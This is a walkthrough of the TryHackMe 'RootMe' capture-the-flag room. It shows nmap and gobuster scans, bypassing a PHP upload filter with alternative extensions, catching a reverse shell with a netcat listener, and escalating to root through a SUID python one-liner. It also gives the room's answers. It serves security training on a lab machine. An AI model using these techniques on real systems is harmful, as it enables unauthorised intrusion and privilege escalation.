# [RootMe | TryHackMe](https://tryhackme.com/room/rrootme)

Gain root access .

# SCANNING STEPS :

## STEP 1 :

Checking **Source Code** **Nothing found**

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="css/home.css">
    <script src="js/maquina_de_escrever.js"></script>
    <title>HackIT - Home</title>
</head>
<body>
    <div class="main-div">
        <p class="title">root@rootme:~#</p>
        <p class="description">
            Can you root me?
        </p>
    </div>

    <!--  -->

    <script>
        const titulo = document.querySelector('.title');
        typeWrite(titulo);
    </script>
</body>
</html>
```

Checking for **robots.txt** **Not found**

```bash
Not Found

The requested URL was not found on this server.
Apache/2.4.29 (Ubuntu) Server at / Port 80
```

## STEP 2 :

Scanning **Ports**

```bash
nmap -sV -sC $IP


Starting Nmap 7.80 ( https://nmap.org ) at 2022-02-21 22:12 CET
Nmap scan report for $ip
Host is up (0.086s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4a:b9:16:08:84:c2:54:48:ba:5c:fd:3f:22:5f:22:14 (RSA)
|_  256 a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d0:82 (ECDSA)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: HackIT - Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.68 seconds

```

Found **2** Ports :

**80 HTML**

**22 SSH**

Scan the machine, how many ports are open? 

**2**



What version of Apache is running?

**2.4.29**

What service is running on port 22?

**SSH**

## STEP 3 :

Scanning url and paths

```bash
*:~/Desktop/THM/RootMe-THM$ gobuster -u $IP/ -w *.txt

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.242.236/
[+] Threads      : 10
[+] Wordlist     : common.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2022/02/21 22:13:07 Starting gobuster
=====================================================
/css (Status: 301)
/js (Status: 301)
/panel (Status: 301)
/uploads (Status: 301)
=====================================================
2022/02/21 22:13:24 Finished
=====================================================

```

Found **2** interesting paths :

**/panel**

**/uploads**



What is the hidden directory?

**/panel**


# EXPLOITING STEPS :

Trying to upload php reverse shell 

## STEP 1 :

Open port 4444 and start listening

```bash
*:~/Desktop/THM/RootMe-THM$ nc -lvnp 4444
Listening on 0.0.0.0 4444

```

## STEP 2 :

Scanning upload request with burp

```http
POST /panel/ HTTP/1.1
Host: x
Referer: x/panel/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=o39v0nr3qpljjgcj4n7al32agr
Connection: close

------WebKitFormBoundary2A5aQD4dVXliJGPo
Content-Disposition: form-data; name="fileUpload"; filename="exploit.php"
Content-Type: application/x-php
```

There was  a **Restriction** on **php** files.

```bash
PHP não é permitido!
```

## STEP 3

Checking if the restriction only on **"php"** word.

```text
PHP File Extensions

File extension and Tags In order for the server to identify our PHP files and scripts, we must save the file with the “.php” extension. Older PHP file extensions include

    .phtml
    .php3
    .php4
    .php5
    .phps

PHP was designed to work with HTML, and as such, it can be embedded into the HTML code.
```

**All other file types accepted** .

## STEP 4 :

Finding **user.txt**

```bash
Connection received on x 52194

$ find -name 'user.txt'
./var/www/user.txt

$ cat ./var/www/user.txt

```

**FOUND USER KEY**

## STEP 5 :

Checking Directories :

```bash
find / -user root -perm /4000

/usr/bin/python
$ which python
/usr/bin/python

```


Search for files with SUID permission, which file is weird?

**/usr/bin/python**

## STEP 6 :

Getting Root access via python :

```bash
$ /usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
$ whoami
root
$ find -name 'root.txt'

./root/root.txt
# cat ./root/root.txt

```

**FOUND THE ROOT KEY**
